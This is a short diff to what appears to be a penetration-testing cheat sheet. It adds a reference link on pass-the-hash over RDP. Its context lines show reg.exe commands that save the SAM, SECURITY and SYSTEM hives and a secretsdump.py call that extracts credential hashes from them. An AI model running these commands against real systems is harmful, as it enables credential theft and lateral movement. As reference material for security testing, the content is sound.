@@ -36,3 +36,8 @@ C:\> reg.exe save hklm\security c:\temp\security.save
 C:\> reg.exe save hklm\system c:\temp\system.save
 $ secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
 ```
+
+
+## References
+
+* [Passing the hash with native RDP client (mstsc.exe)](https://michael-eder.net/post/2018/native_rdp_pass_the_hash/)
